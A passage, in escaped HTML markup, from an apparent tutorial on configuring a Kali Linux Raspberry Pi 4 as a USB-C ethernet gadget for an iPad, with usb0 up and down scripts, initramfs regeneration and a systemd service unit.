&lt;span id=&quot;cb7-33&quot;&gt;&lt;a href=&quot;#cb7-33&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;dhcp-authoritative&lt;/span&gt;
&lt;span id=&quot;cb7-34&quot;&gt;&lt;a href=&quot;#cb7-34&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;leasefile-ro&lt;/span&gt;
&lt;span id=&quot;cb7-35&quot;&gt;&lt;a href=&quot;#cb7-35&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;EOF&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-36&quot;&gt;&lt;a href=&quot;#cb7-36&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-37&quot;&gt;&lt;a href=&quot;#cb7-37&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Regenerate initramfs.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-38&quot;&gt;&lt;a href=&quot;#cb7-38&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-39&quot;&gt;&lt;a href=&quot;#cb7-39&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mkinitramfs&lt;/span&gt; -o /boot/initramfs.zst &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-40&quot;&gt;&lt;a href=&quot;#cb7-40&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; -1 /lib/modules &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;-Re4son-v8l+$&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;tail&lt;/span&gt; -1&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-41&quot;&gt;&lt;a href=&quot;#cb7-41&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-42&quot;&gt;&lt;a href=&quot;#cb7-42&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-43&quot;&gt;&lt;a href=&quot;#cb7-43&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-44&quot;&gt;&lt;a href=&quot;#cb7-44&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create /usr/local/sbin/usb0up.sh:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode sh&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-2&quot;&gt;&lt;a href=&quot;#cb8-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-3&quot;&gt;&lt;a href=&quot;#cb8-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;modprobe&lt;/span&gt; libcomposite&lt;/span&gt;
&lt;span id=&quot;cb8-4&quot;&gt;&lt;a href=&quot;#cb8-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-5&quot;&gt;&lt;a href=&quot;#cb8-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; /sys/kernel/config/usb_gadget&lt;/span&gt;
&lt;span id=&quot;cb8-6&quot;&gt;&lt;a href=&quot;#cb8-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-7&quot;&gt;&lt;a href=&quot;#cb8-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt; [&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;-d&lt;/span&gt; pi4&lt;span class=&quot;bu&quot;&gt; ]&lt;/span&gt;; &lt;span class=&quot;kw&quot;&gt;then&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-8&quot;&gt;&lt;a href=&quot;#cb8-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;mkdir&lt;/span&gt; -p pi4&lt;/span&gt;
&lt;span id=&quot;cb8-9&quot;&gt;&lt;a href=&quot;#cb8-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; pi4&lt;/span&gt;
&lt;span id=&quot;cb8-10&quot;&gt;&lt;a href=&quot;#cb8-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-11&quot;&gt;&lt;a href=&quot;#cb8-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; 0x1d6b &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; idVendor  # Linux Foundation&lt;/span&gt;
&lt;span id=&quot;cb8-12&quot;&gt;&lt;a href=&quot;#cb8-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; 0x0104 &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; idProduct &lt;span class=&quot;co&quot;&gt;# Multifunction Composite Gadget&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-13&quot;&gt;&lt;a href=&quot;#cb8-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; 0x0100 &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; bcdDevice &lt;span class=&quot;co&quot;&gt;# v1.0.0&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-14&quot;&gt;&lt;a href=&quot;#cb8-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; 0x0200 &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; bcdUSB    # USB2&lt;/span&gt;
&lt;span id=&quot;cb8-15&quot;&gt;&lt;a href=&quot;#cb8-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; 0xef   &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; bDeviceClass&lt;/span&gt;
&lt;span id=&quot;cb8-16&quot;&gt;&lt;a href=&quot;#cb8-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; 0x02   &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; bDeviceSubClass&lt;/span&gt;
&lt;span id=&quot;cb8-17&quot;&gt;&lt;a href=&quot;#cb8-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; 0x01   &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; bDeviceProtocol&lt;/span&gt;
&lt;span id=&quot;cb8-18&quot;&gt;&lt;a href=&quot;#cb8-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-19&quot;&gt;&lt;a href=&quot;#cb8-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;mkdir&lt;/span&gt; -p strings/0x409&lt;/span&gt;
&lt;span id=&quot;cb8-20&quot;&gt;&lt;a href=&quot;#cb8-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-21&quot;&gt;&lt;a href=&quot;#cb8-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt;  fedcba9876543211 &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; strings/0x409/serialnumber&lt;/span&gt;
&lt;span id=&quot;cb8-22&quot;&gt;&lt;a href=&quot;#cb8-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;Kali Linux&amp;#39;&lt;/span&gt;      &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; strings/0x409/manufacturer&lt;/span&gt;
&lt;span id=&quot;cb8-23&quot;&gt;&lt;a href=&quot;#cb8-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;Kali Linux&amp;#39;&lt;/span&gt;      &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; strings/0x409/product&lt;/span&gt;
&lt;span id=&quot;cb8-24&quot;&gt;&lt;a href=&quot;#cb8-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-25&quot;&gt;&lt;a href=&quot;#cb8-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;mkdir&lt;/span&gt; -p configs/c.1/strings/0x409&lt;/span&gt;
&lt;span id=&quot;cb8-26&quot;&gt;&lt;a href=&quot;#cb8-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-27&quot;&gt;&lt;a href=&quot;#cb8-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;Config 1: ECM network&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; configs/c.1/strings/0x409/configuration&lt;/span&gt;
&lt;span id=&quot;cb8-28&quot;&gt;&lt;a href=&quot;#cb8-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt;  250                    &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; configs/c.1/MaxPower&lt;/span&gt;
&lt;span id=&quot;cb8-29&quot;&gt;&lt;a href=&quot;#cb8-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-30&quot;&gt;&lt;a href=&quot;#cb8-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;mkdir&lt;/span&gt; -p functions/ecm.usb0&lt;/span&gt;
&lt;span id=&quot;cb8-31&quot;&gt;&lt;a href=&quot;#cb8-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-32&quot;&gt;&lt;a href=&quot;#cb8-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;00:dc:c8:f7:75:14&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; functions/ecm.usb0/host_addr &lt;span class=&quot;co&quot;&gt;# HostPC&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-33&quot;&gt;&lt;a href=&quot;#cb8-33&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;00:dd:dc:eb:6d:a1&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; functions/ecm.usb0/dev_addr  # BadUSB&lt;/span&gt;
&lt;span id=&quot;cb8-34&quot;&gt;&lt;a href=&quot;#cb8-34&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-35&quot;&gt;&lt;a href=&quot;#cb8-35&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;ln&lt;/span&gt; -s functions/ecm.usb0 configs/c.1/ecm.usb0&lt;/span&gt;
&lt;span id=&quot;cb8-36&quot;&gt;&lt;a href=&quot;#cb8-36&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-37&quot;&gt;&lt;a href=&quot;#cb8-37&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;udevadm&lt;/span&gt; settle -t 5 &lt;span class=&quot;kw&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-38&quot;&gt;&lt;a href=&quot;#cb8-38&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-39&quot;&gt;&lt;a href=&quot;#cb8-39&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; /sys/class/udc &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; UDC&lt;/span&gt;
&lt;span id=&quot;cb8-40&quot;&gt;&lt;a href=&quot;#cb8-40&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create /usr/local/sbin/usb0down.sh:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb9&quot;&gt;&lt;pre class=&quot;sourceCode sh&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb9-1&quot;&gt;&lt;a href=&quot;#cb9-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-2&quot;&gt;&lt;a href=&quot;#cb9-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-3&quot;&gt;&lt;a href=&quot;#cb9-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; /sys/kernel/config/usb_gadget&lt;/span&gt;
&lt;span id=&quot;cb9-4&quot;&gt;&lt;a href=&quot;#cb9-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-5&quot;&gt;&lt;a href=&quot;#cb9-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt; [&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;-d&lt;/span&gt; pi4&lt;span class=&quot;bu&quot;&gt; ]&lt;/span&gt;; &lt;span class=&quot;kw&quot;&gt;then&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-6&quot;&gt;&lt;a href=&quot;#cb9-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; pi4&lt;/span&gt;
&lt;span id=&quot;cb9-7&quot;&gt;&lt;a href=&quot;#cb9-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; UDC&lt;/span&gt;
&lt;span id=&quot;cb9-8&quot;&gt;&lt;a href=&quot;#cb9-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-9&quot;&gt;&lt;a href=&quot;#cb9-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;rm&lt;/span&gt; -f configs/c.1/ecm.usb0&lt;/span&gt;
&lt;span id=&quot;cb9-10&quot;&gt;&lt;a href=&quot;#cb9-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-11&quot;&gt;&lt;a href=&quot;#cb9-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;rmdir&lt;/span&gt; functions/ecm.usb0&lt;/span&gt;
&lt;span id=&quot;cb9-12&quot;&gt;&lt;a href=&quot;#cb9-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;rmdir&lt;/span&gt; configs/c.1/strings/0x409&lt;/span&gt;
&lt;span id=&quot;cb9-13&quot;&gt;&lt;a href=&quot;#cb9-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;rmdir&lt;/span&gt; configs/c.1&lt;/span&gt;
&lt;span id=&quot;cb9-14&quot;&gt;&lt;a href=&quot;#cb9-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;rmdir&lt;/span&gt; strings/0x409&lt;/span&gt;
&lt;span id=&quot;cb9-15&quot;&gt;&lt;a href=&quot;#cb9-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-16&quot;&gt;&lt;a href=&quot;#cb9-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; ..&lt;/span&gt;
&lt;span id=&quot;cb9-17&quot;&gt;&lt;a href=&quot;#cb9-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;rmdir&lt;/span&gt; pi4&lt;/span&gt;
&lt;span id=&quot;cb9-18&quot;&gt;&lt;a href=&quot;#cb9-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; /&lt;/span&gt;
&lt;span id=&quot;cb9-19&quot;&gt;&lt;a href=&quot;#cb9-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-20&quot;&gt;&lt;a href=&quot;#cb9-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;rmmod&lt;/span&gt; usb_f_ecm&lt;/span&gt;
&lt;span id=&quot;cb9-21&quot;&gt;&lt;a href=&quot;#cb9-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;rmmod&lt;/span&gt; u_ether&lt;/span&gt;
&lt;span id=&quot;cb9-22&quot;&gt;&lt;a href=&quot;#cb9-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;rmmod&lt;/span&gt; libcomposite&lt;/span&gt;
&lt;span id=&quot;cb9-23&quot;&gt;&lt;a href=&quot;#cb9-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The usb0down.sh script is something you won't find in other tutorials about setting up a Raspberry Pi in USB gadget mode. Those all focus on bringing the usb0 interface up - none cover how to tear it down successfully. Unfortunately, iPadOS 15 doesn't like it when USB ethernet gadget goes partially down when exiting the initramfs (we'll cover this part of things in the next section). To work around this, we need to have the ability to completely remove usb0 so that the device doesn't exist at all when the initramfs terminates and normal userland takes over.&lt;/p&gt;&lt;p&gt;Now that we can bring usb0 &lt;em&gt;completely&lt;/em&gt; up and down, let's tie things together. Create the systemd service file /etc/systemd/system/usb0.service:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb10&quot;&gt;&lt;pre class=&quot;sourceCode ini&quot;&gt;&lt;code class=&quot;sourceCode ini&quot;&gt;&lt;span id=&quot;cb10-1&quot;&gt;&lt;a href=&quot;#cb10-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;[Unit]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-2&quot;&gt;&lt;a href=&quot;#cb10-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;Raspberry Pi USB C ethernet gadget mode&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-3&quot;&gt;&lt;a href=&quot;#cb10-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;Before&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;network.target NetworkManager.service dnsmasq.service&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-4&quot;&gt;&lt;a href=&quot;#cb10-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;Requires&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;systemd-modules-load.service&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-5&quot;&gt;&lt;a href=&quot;#cb10-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-6&quot;&gt;&lt;a href=&quot;#cb10-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;[Install]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-7&quot;&gt;&lt;a href=&quot;#cb10-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;WantedBy&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;sysinit.target&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-8&quot;&gt;&lt;a href=&quot;#cb10-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-9&quot;&gt;&lt;a href=&quot;#cb10-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;[Service]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-10&quot;&gt;&lt;a href=&quot;#cb10-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;oneshot&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-11&quot;&gt;&lt;a href=&quot;#cb10-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;ExecStartPre&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/usr/local/sbin/usb0up.sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-12&quot;&gt;&lt;a href=&quot;#cb10-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/usr/sbin/ifup usb0&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-13&quot;&gt;&lt;a href=&quot;#cb10-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;ExecStop&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/usr/sbin/ifdown usb0&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-14&quot;&gt;&lt;a href=&quot;#cb10-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;ExecStopPost&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/usr/local/sbin/usb0down.sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-15&quot;&gt;&lt;a href=&quot;#cb10-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;RemainAfterExit&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, let's activate everything.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb11&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb11-1&quot;&gt;&lt;a href=&quot;#cb11-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-2&quot;&gt;&lt;a href=&quot;#cb11-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-3&quot;&gt;&lt;a href=&quot;#cb11-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb11-4&quot;&gt;&lt;a href=&quot;#cb11-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-5&quot;&gt;&lt;a href=&quot;#cb11-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Make our usb0.sh script executable.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-6&quot;&gt;&lt;a href=&quot;#cb11-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-7&quot;&gt;&lt;a href=&quot;#cb11-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/local/sbin/usb0up.sh&lt;/span&gt;
&lt;span id=&quot;cb11-8&quot;&gt;&lt;a href=&quot;#cb11-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/local/sbin/usb0down.sh&lt;/span&gt;
&lt;span id=&quot;cb11-9&quot;&gt;&lt;a href=&quot;#cb11-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-10&quot;&gt;&lt;a href=&quot;#cb11-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Enable required services.&lt;/span&gt;&lt;/span&gt;
